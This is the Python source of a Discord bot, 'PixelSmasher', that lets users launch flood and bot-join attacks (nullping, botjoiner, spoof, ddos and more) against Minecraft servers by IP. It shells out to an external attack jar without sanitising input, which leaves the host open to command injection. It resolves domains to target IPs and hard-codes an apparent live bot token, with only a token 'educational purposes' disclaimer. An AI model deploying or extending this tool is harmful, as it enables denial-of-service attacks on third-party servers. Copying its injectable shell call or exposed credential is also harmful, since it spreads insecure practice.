import discord
from discord.ext import commands
import asyncio
import socket
import psutil
import subprocess

intents = discord.Intents.all()
bot = commands.Bot(command_prefix='$', intents=intents)

# Define the allowed channel ID where the bot can respond
ALLOWED_CHANNEL_ID = 1253947063331328042

# Dictionary to store ongoing attacks
ongoing_attacks = {}

# Define a cooldown for the attack command (1 minute cooldown)
attack_cooldown = commands.CooldownMapping.from_cooldown(1, 30, commands.BucketType.user)

@bot.command(name='convert')
async def convert_command(ctx, domain: str):
    """Converts a domain to its corresponding IP address."""
    try:
        ip_address = socket.gethostbyname(domain)
        await ctx.send(f'The IP address for {domain} is: {ip_address}')
    except socket.error as e:
        await ctx.send(f'Error: {str(e)}')

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')
    await bot.change_presence(activity=discord.Game(name="PixelSmasher on TOP"))

@bot.event
async def on_message(message):
    # Check if the message is from the bot itself
    if message.author == bot.user:
        return

    # Process commands from messages
    await bot.process_commands(message)

@bot.command(name='stop')
async def stop_command(ctx):
    """Stop the most recent ongoing attack."""
    if ctx.author.id not in ongoing_attacks:
        await ctx.send("There is no ongoing attack to stop.")
        return

    try:
        ongoing_attacks[ctx.author.id].terminate()
        del ongoing_attacks[ctx.author.id]
        await ctx.send("Attack stopped successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred while stopping the attack: {e}")

@bot.command(name='support')
async def support_command(ctx):
    support_embed = discord.Embed(
        title='PixelSmasher Commands',
        description='**PixelSmasher, A Minecraft Bot Attack Discord Bot**:',
        color=discord.Color.blurple()
    )
    support_embed.add_field(
        name='`!support`',
        value='Show this support message. Get a list of all available commands.',
        inline=False
    )
    support_embed.add_field(
        name='`!methods`',
        value='Display a list of available attack methods.',
        inline=False
    )
    support_embed.add_field(
        name='`!attack <ip> <method> <protocol> <duration> `',
        value='Launch a bot attack with the specified IP, method, and optional duration (default: 10 seconds).',
        inline=False
    )
    support_embed.add_field(
        name='`!stop`',
        value='Stop the ongoing attack.',
        inline=False
    )
    support_embed.add_field(
        name='`!stats`',
        value='Display current RAM and CPU usage.',
        inline=False
    )
    support_embed.add_field(
        name='`!protocols`',
        value='Display the list of Minecraft protocols thatcould be attacked .',
        inline=False
    )
    support_embed.add_field(
        name='`!convert <domain>`',
        value='Converts a domain to its corresponding IP address.',
        inline=False
    )
    support_embed.add_field(
        name='`!ddos <ip>`',
        value='ddos on the ip address.',
        inline=False
    )
    support_embed.add_field(
        name='Disclaimer',
        value='This bot is for educational purposes only. Usage of this bot for malicious activities is strictly prohibited.',
        inline=False
    )
    await ctx.send(embed=support_embed)


@bot.command(name='methods')
async def methods_command(ctx):
    attack_methods = [
        "bigpacket", "botjoiner", "doublejoin", "emptypacket", "handshake",
        "invaliddata", "invalidspoof", "invalidnames", "spoof", "join", "legacyping",
        "legitnamejoin", "localhost", "pingjoin", "longhost", "longnames", "nullping",
        "ping", "query", "randompacket", "bighandshake", "unexpectedpacket", "memory"
    ]

    methods_list = '\n'.join(attack_methods)
    methods_embed = discord.Embed(
        title='Available Attack Methods',
        description=f'```{methods_list}```',
        color=discord.Color.dark_blue()
    )
    await ctx.send(embed=methods_embed)

@bot.command(name='protocols')
async def protocols_command(ctx):
    """Display the list of Minecraft protocols."""
    protocols_message = (
        "𝗣𝗿𝗼𝘁𝗼𝗰𝗼𝗹𝘀\n"
        "1.18.2  >  758\n"
        "1.18.1  >  757\n"
        "1.18    >  757\n"
        "1.17.1  >  756\n"
        "1.16.5  >  754\n"
        "1.16.3  >  753\n"
        "1.16.2  >  751\n"
        "1.16.1  >  736\n"
        "1.16    >  735\n"
        "1.15.1  >  575\n"
        "1.15.2  >  578\n"
        "1.15.1  >  575\n"
        "1.15    >  573\n"
        "1.14.4  >  498\n"
        "1.14.3  >  490\n"
        "1.14.2  >  485\n"
        "1.14.1  >  480\n"
        "1.14    >  477\n"
        "1.13.2  >  404\n"
        "1.13.1  >  401\n"
        "1.13    >  393\n"
        "1.12.2  >  340\n"
        "1.10.2  >  210\n"
        "1.8.9   >   47"
    )

    protocols_embed = discord.Embed(
        title='Minecraft Protocols',
        description=protocols_message,
        color=discord.Color.dark_purple()
    )

    await ctx.send(embed=protocols_embed)
@bot.command(name='attack')
@commands.cooldown(1, 5, commands.BucketType.user)  # Cooldown set to 5 seconds
async def attack_command(ctx, ip: str, method: str, protocol: int, duration: int = 20):
    """Launch a bot attack with the specified IP, method, protocol, and optional duration."""
    valid_methods = [
        "bigpacket", "botjoiner", "doublejoin", "emptypacket", "handshake",
        "invaliddata", "invalidspoof", "invalidnames", "spoof", "join", "legacyping",
        "legitnamejoin", "localhost", "pingjoin", "longhost", "longnames", "nullping",
        "ping", "query", "randompacket", "bighandshake", "unexpectedpacket", "memory", "ddos"
    ]

    if method.lower() not in valid_methods:
        await ctx.send(f'Invalid attack method. Use `$methods` to see the list of available methods.')
        return

    try:
        bucket = attack_cooldown.get_bucket(ctx.message)
        retry_after = bucket.update_rate_limit()

        if retry_after:
            raise commands.CommandOnCooldown(bucket, retry_after)

        command_to_run = f'java -jar FuckBot.jar {ip} {protocol} {method} {duration} -1'

        process = await asyncio.create_subprocess_shell(
            command_to_run,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        _, stderr = await process.communicate()

        if process.returncode != 0:
            raise Exception(f'Error: {stderr.decode() if stderr else "Unknown error"}')

        success_embed = discord.Embed(
            title='✅ Attack Successful ✅',
            description=f'The {method} attack on {ip} with protocol {protocol} for {duration} seconds has started!',
            color=discord.Color.green()
        )

        await ctx.send(embed=success_embed)

    except commands.CommandOnCooldown as e:
        await ctx.send(f'You are on cooldown. Try again in {round(e.retry_after, 2)}s')
    except Exception as e:
        await ctx.send(f'Error: {str(e)}')



@bot.command(name='stats')
async def stats_command(ctx):
    """Display current RAM and CPU usage."""
    cpu_percent = psutil.cpu_percent()
    ram_usage = psutil.virtual_memory().percent

    stats_embed = discord.Embed(
        title='System Stats',
        color=discord.Color.blue()
    )
    stats_embed.add_field(name='CPU Usage', value=f'{cpu_percent}%')
    stats_embed.add_field(name='RAM Usage', value=f'{ram_usage}%')

    if cpu_percent > 70 or ram_usage > 80:
        # If CPU usage is high or RAM usage is high, display thumbs-down image
        stats_embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1194272858403241984/1194773336585158827/Black_Dislike_Thumb_pointing_down-removebg-preview.png?ex=65b19261&is=659f1d61&hm=e730c1c3c5b6e9832da1c08fc4e54bfe43e4bfc6fc7e7f4a9c8d50b013ecabf2&')
    else:
        # If both CPU and RAM usage are within acceptable limits, display thumbs-up image
        stats_embed.set_thumbnail(url='https://cdn.discordapp.com/attachments/1194272858403241984/1194773460539408445/download-removebg-preview.png?ex=65b1927e&is=659f1d7e&hm=789b575f0cedb514e8d0f5fe981b7fc0c91238561d4973a8e85021bf8e39f647&')

    await ctx.send(embed=stats_embed)

@bot.command(name='hello')
async def hello(ctx):
    # Check if the command is executed in the allowed channel
    if ctx.channel.id == ALLOWED_CHANNEL_ID:
        await ctx.send('Hello! I can only respond in the specified channel.')
    else:
        await ctx.send('Sorry, I can only respond in a specific channel.')

# Replace 'YOUR_BOT_TOKEN' with your actual bot token
bot.run('MTI1NDAwODMxODkwNTY3OTk0NA.GqY9Qw.YqWYvgeDjB_Juz06P5Giak-zIMs9IcqmXj0Hd0')



